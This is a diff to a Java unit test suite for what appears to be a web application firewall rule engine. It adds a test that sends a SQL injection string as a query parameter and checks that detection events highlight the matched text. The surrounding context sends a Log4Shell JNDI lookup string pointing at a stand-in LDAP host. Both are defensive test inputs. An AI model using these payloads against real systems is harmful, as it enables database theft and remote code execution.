@@ -54,6 +54,14 @@ class EngineTest {
     }
 
     @Test
+    void eventoTrazOTrechoQueCasouQuandoARegraEDeExpressao() {
+        var result = run(Map.of("server.request.query", Map.of("q", List.of("') UNION SELECT sql FROM t--"))));
+        assertEquals("match", result.outcome());
+        String json = new Gson().toJson(result.events());
+        assertTrue(json.contains("\"highlight\""), json);
+    }
+
+    @Test
     void regrasProprias() {
         Map<String, Object> log4j = Map.of("server.request.headers.no_cookies", Map.of("x-api", "${jndi:ldap://x.example/a}"));
         assertTrue(String.valueOf(run(log4j).events()).contains("tlv-000-111"));
